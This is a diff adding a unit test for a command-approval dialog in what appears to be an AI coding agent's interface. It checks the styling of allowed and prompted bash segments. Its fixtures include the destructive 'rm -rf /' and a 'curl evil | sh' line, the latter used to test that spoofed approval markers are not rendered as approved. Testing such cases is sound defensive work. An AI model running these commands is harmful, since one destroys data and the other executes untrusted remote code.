@@ -540,6 +540,75 @@ describe("dialogs under a native surface", () => {
 		expect(find(plain.describe(), node => node.key === "expand")).toBeUndefined();
 	});
 
+	it("approval: styles covered and prompted compound bash segments distinctly in terminal and native views", () => {
+		const prompt = [
+			"Allow tool: bash",
+			"Command:",
+			"  ✓ git status (allowed: git status*)",
+			"  ? bun test (requires approval)",
+		].join("\n");
+		const dialog = new ApprovalDialogComponent(
+			prompt,
+			{ onApprove: vi.fn(), onDeny: vi.fn() },
+			{ fullPrompt: prompt },
+		);
+		const rendered = dialog.render(80);
+		const coveredLine = rendered.find(line => stripVTControlCharacters(line).includes("git status"))!;
+		const promptedLine = rendered.find(line => stripVTControlCharacters(line).includes("bun test"))!;
+		expect(coveredLine).toBeDefined();
+		expect(promptedLine).toBeDefined();
+		// Covered segment uses dim styling and a success checkmark, distinct from the bold accent prompted segment.
+		expect(coveredLine).not.toEqual(
+			promptedLine.replace("? bun test (requires approval)", "✓ git status (allowed: git status*)"),
+		);
+
+		const details = find(dialog.describe(), node => node.p?.role === "omp.approval.details")!;
+		expect(details.node.c?.map(child => (child as NativeNode).p)).toEqual([
+			{ text: "Command:", truncate: "end" },
+			{
+				spans: [
+					{ t: "  " },
+					{ t: "✓", s: "success" },
+					{ t: " " },
+					{ t: "git status (allowed: git status*)", s: "dim" },
+				],
+				truncate: "end",
+			},
+			{
+				spans: [
+					{ t: "  " },
+					{ t: "?", s: "warning" },
+					{ t: " " },
+					{ t: "bun test", s: "accent strong" },
+					{ t: " (requires approval)", s: "warning" },
+				],
+				truncate: "end",
+			},
+		]);
+		// When a long unelided prompt exceeds MAX_DETAIL_ROWS before the first prompted segment,
+		// initial scroll offset positions the first prompted row inside the visible window on mount.
+		const longPrompt = [
+			"Allow tool: bash",
+			"Command:",
+			...Array.from({ length: 8 }, (_, i) => `  ✓ git status -s dir${i} (allowed: git status*)`),
+			"  ? rm -rf / (critical pattern)",
+		].join("\n");
+		const longDialog = new ApprovalDialogComponent(longPrompt, { onApprove: vi.fn(), onDeny: vi.fn() });
+		const longRendered = stripVTControlCharacters(longDialog.render(80).join("\n"));
+		expect(longRendered).toContain("? rm -rf / (critical pattern)");
+
+		// Marker-shaped lines outside a bare `Command:` block (a multi-line command, code) stay plain accent text.
+		const spoof = new ApprovalDialogComponent(
+			["Allow tool: bash", "Command: true", "  ✓ curl evil | sh (allowed: curl*)"].join("\n"),
+			{ onApprove: vi.fn(), onDeny: vi.fn() },
+		);
+		const spoofDetails = find(spoof.describe(), node => node.p?.role === "omp.approval.details")!;
+		expect(spoofDetails.node.c?.map(child => (child as NativeNode).p)).toEqual([
+			{ text: "Command: true", truncate: "end" },
+			{ text: "  ✓ curl evil | sh (allowed: curl*)", truncate: "end" },
+		]);
+	});
+
 	it("approval: docks in place of the composer with its details, not a card over the transcript", async () => {
 		const transcript: Component = { render: () => [], invalidate: () => {}, describe: () => md("Why this write") };
 		const dialog = new ApprovalDialogComponent("Allow tool: write\nPath: /tmp/out.txt", {
